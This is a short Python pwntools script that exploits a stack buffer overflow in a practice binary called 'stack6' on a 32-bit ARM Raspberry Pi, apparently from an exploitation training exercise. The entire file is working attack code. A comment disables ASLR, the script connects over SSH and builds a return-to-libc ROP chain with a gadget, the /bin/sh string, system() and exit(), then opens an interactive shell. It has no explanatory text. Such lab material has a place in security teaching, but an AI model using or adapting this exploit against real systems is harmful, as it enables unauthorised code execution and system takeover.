# Tested on 64bit Ubuntu, macOS
# Target : 32bit ARM, Raspberry Pi, Raspbian OS
# Python 3.7.6
# pwntools 4.2.2

# import all modules/commands from pwn library
from pwn import *
import time

# disable ASLR
# echo 0 > /proc/sys/kernel/randomize_va_space

# set the context of the target platform
#  arch: arm (32bit)
#  os: linux
context.update(arch='arm', os='linux')

r = ssh(user="pi", host="target ip", port=22, password="password")
p = r.process(executable="/home/pi/arm_exploitation/stack/stack6/stack6",
                      cwd="/home/pi/arm_exploitation/stack/stack6/flag", env={})
 	
# Creating Payload
payload = cyclic(cyclic_find(0x61616172))  # 68 = buffer(64) + saved_fp(4)

LIBC_BASE = 0x76e53000
GADGET = LIBC_BASE + 0x000791fc  # pop {r0, r4, pc};
SYSTEM = 0x76e8b9c8
BINSH = 0x76f7eb6c
EXIT = 0x76e81780

payload += p32(GADGET)  # gadget : pop {r0, r4, pc};
payload += p32(BINSH)   # r0 : /bin/sh
payload += b'FAKE'      # r4 : dummy value
payload += p32(SYSTEM)  # pc : addr of system()
payload += p32(EXIT)    # addr of exit() (graceful shutdown) 

print("payload len : {}".format(len(payload)))
print("paylaod     : {}".format(payload))

# Sending Payload
print("[+] Sending payload..")
p.sendline(payload)
sleep(1)

p.interactive()



